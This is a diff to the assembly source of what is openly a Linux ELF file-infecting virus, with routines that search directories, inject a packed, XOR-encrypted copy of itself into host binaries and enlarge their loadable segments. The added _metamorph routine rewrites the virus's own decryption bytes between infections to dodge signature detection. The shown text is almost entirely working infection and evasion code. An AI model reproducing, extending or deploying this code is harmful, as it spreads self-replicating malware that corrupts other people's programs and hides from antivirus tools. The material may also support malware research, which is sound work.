@@ -24,6 +24,9 @@ section.text:
 ; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
 ; order (make sense with syscall)
 
+; Doc:
+; https://tel.archives-ouvertes.fr/tel-00660274/document
+
 _params:; filled for infected binaries
 	length dq 0x0; length of the packed virus
 	entry_inject dq 0x0; entry of the virus in file
@@ -201,11 +204,9 @@ _h3ll0w0rld:
 %endif
 
 	; host part
-	push r14
 	call _make_virus_map
 	call _search_dir
 	call _munmap_virus
-	pop r14
 
 	jmp _exit
 	.infected:
@@ -217,6 +218,9 @@ _h3ll0w0rld:
 		cmp rax, 0x0
 		jz _virus
 %else
+; = DEBUG
+;		jmp _virus
+; =
 		call _virus
 %endif
 		jmp _prg
@@ -505,7 +509,7 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 ; = DEBUG
-; db `test`, 0x0
+;	db `pack_start`, 0x0
 ; =
 _search_dir:
 %ifdef FSOCIETY
@@ -1117,6 +1121,17 @@ _infect:
 	push 8 * 3
 	pop rcx
 
+	push rdi
+	mov rdi, r8
+	push r8
+	push rsi
+	push rcx
+	call _metamorph
+	pop rcx
+	pop rsi
+	pop r8
+	pop rdi
+
 	sub rdx, rcx
 	; copy virus
 	add rdi, rcx
@@ -1170,10 +1185,6 @@ _infect:
 	push rax
 	pop rcx
 	pop rdi
-;	rdi ok
-;	rsi ok
-;	rdx ok
-;	rcx ok
 
 	call _xor_encrypt
 
@@ -1205,6 +1216,84 @@ _infect:
 	; change pt_load size
 	add [rbx + phdr.p_filesz], rdx; p_filesz + virus
 	add [rbx + phdr.p_memsz], rdx; p_memsz + virus
+ret
+
+_metamorph:; (rdi -> ptr)
+	; xor_encrypt
+	lea rax, [rel _params]
+	lea rsi, [rel _exit]
+	lea rcx, [rel _xor_encrypt]
+	sub rsi, rcx
+	sub rcx, rax
+	mov rax, rdi
+	push rax
+	add rdi, rcx
+	sub rdi, 8 * 3
+	xor rcx, rcx
+	cmp byte[rdi + 1], 0x56
+	je .reset_metamorph_xor_encrypt
+	.metamorph_xor_encrypt: ; (rdi ptr, rsi len)
+		cmp rcx, rsi
+		jge .break
+		cmp byte[rdi + rcx], 0x41
+		je .push
+		cmp byte[rdi + rcx], 0x4d
+		je .xor
+		cmp byte[rdi + rcx], 0x49
+		je .cmp
+		cmp byte[rdi + rcx], 0x42
+		je .mov_xor_byte
+		jmp .continue
+		.push:
+			inc rcx
+			inc byte[rdi + rcx]
+			jmp .continue
+		.xor:
+			add rcx, 2
+			add byte[rdi + rcx], 9
+			jmp .continue
+		.cmp:
+			add rcx, 2
+			inc byte[rdi + rcx]
+			jmp .continue
+		.mov_xor_byte:
+			add rcx, 3
+			add byte[rdi + rcx], 8
+		.continue:
+		inc rcx
+	jmp .metamorph_xor_encrypt
+	.reset_metamorph_xor_encrypt: ; (rdi ptr, rsi len)
+		cmp rcx, rsi
+		jge .break
+		cmp byte[rdi + rcx], 0x41
+		je .push_reset
+		cmp byte[rdi + rcx], 0x4d
+		je .xor_reset
+		cmp byte[rdi + rcx], 0x49
+		je .cmp_reset
+		cmp byte[rdi + rcx], 0x42
+		je .mov_xor_byte_reset
+		jmp .continue_reset
+		.push_reset:
+			inc rcx
+			sub byte[rdi + rcx], 6
+			jmp .continue_reset
+		.xor_reset:
+			add rcx, 2
+			sub byte[rdi + rcx], 9 * 6
+			jmp .continue_reset
+		.cmp_reset:
+			add rcx, 2
+			sub byte[rdi + rcx], 6
+			jmp .continue_reset
+		.mov_xor_byte_reset:
+			add rcx, 3
+			sub byte[rdi + rcx], 8 * 6
+		.continue_reset:
+		inc rcx
+	jmp .reset_metamorph_xor_encrypt
+	.break:
+	pop rax
 ret
 
 ;						fingerprint
